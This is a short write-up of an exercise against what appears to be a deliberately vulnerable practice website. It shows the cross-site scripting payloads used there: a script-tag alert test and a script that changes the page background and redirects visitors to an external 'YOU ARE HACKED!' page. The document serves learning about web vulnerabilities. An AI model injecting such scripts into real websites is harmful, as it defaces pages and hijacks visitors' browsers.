# XSS Cross-Site Scripting

This task required us to perform a XSS cross-site scripting attack on the given website.
https://gcixsstask.herokuapp.com

The 4 attacks are
- alert box saying "HACKED"
- change background colour of website to red
- change background of website to image of my choice
- redirect to another website saying "You Are Hacked"

## Solution
On the given site, an input box can be seen.

A simple XSS test by inputting `<script>alert("HACKED")</script` into the box and having the website execute it already proved it to be XSS-vulnerable.

To get started, I wrote a very simple HTML file containing the js code for each of the attacks.

```javascript=
<script>
    alert("HACKED!");
    document.body.style.background = "red";
    document.body.style.backgroundImage = "url(https://www.wallpaperup.com/uploads/wallpapers/2014/03/25/309166/500ec936912c61a4ad63e9bbe1647da7-700.jpg)";
    window.location.href = "https://regardlesssalmon.htmlpasta.com/";
</script>
```

All we have to do is execute each of these lines of code together with the `<script></script>` tags into the input box and done!

The external HTML site to direct to was made with [HTML Pasta](https://htmlpasta.com)

Here's the HTML code I used for the site:
```HTML
<html>
    <h1 style="text-align: center;">YOU ARE HACKED!</h1>
</html>
```

## Screenshots
![](https://i.imgur.com/2nIkU4X.png)

![](https://i.imgur.com/3tPDg2Q.png)

![](https://i.imgur.com/IQP3yfG.jpg)

![](https://i.imgur.com/x2xs1EN.png)



